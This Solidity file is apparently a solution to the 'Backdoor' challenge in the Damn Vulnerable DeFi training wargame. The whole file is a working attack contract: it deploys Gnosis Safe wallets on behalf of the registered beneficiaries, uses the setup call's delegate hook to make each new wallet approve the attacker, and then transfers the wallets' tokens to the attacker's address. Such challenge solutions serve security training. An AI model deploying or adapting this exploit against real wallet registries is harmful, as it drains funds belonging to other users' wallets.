// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

/**
 * @title Attacker
 * @author kyrers
 * @notice This contract executes the full attack.
 */
contract BackdoorAttacker {
    address private immutable attacker;
    address private immutable gnosisSafe;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvtToken;

    constructor(address _gnosisSafe, address _walletFactory, address _walletRegistry, address _token) {
        attacker = msg.sender;
        gnosisSafe = _gnosisSafe;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        dvtToken = DamnValuableToken(_token);
    }

    function approveContract(address _spender) external {
        dvtToken.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // Create wallet for every beneficiary
        for (uint256 i = 0; i < 4; i++) {
            address[] memory victim = new address[](1);
            victim[0] = _beneficiaries[i];

            // Create the data to be executed on the WalletRegistry.proxyCreated(...) function. 
            // The first parameter tells the newly created proxy where to redirect us to - in our case it is the GnosisSafe setup(...) function,.
            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, victim, 1, address(this), abi.encodeWithSignature("approveContract(address)", address(this)), address(0), 0, 0);

            // Create proxy
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(gnosisSafe, initializer, i, IProxyCreationCallback(walletRegistry));

            //Callback has been executed, we can now send the funds to the attacker
            dvtToken.transferFrom(address(proxy), attacker, 10 ether);
        }
    }
}
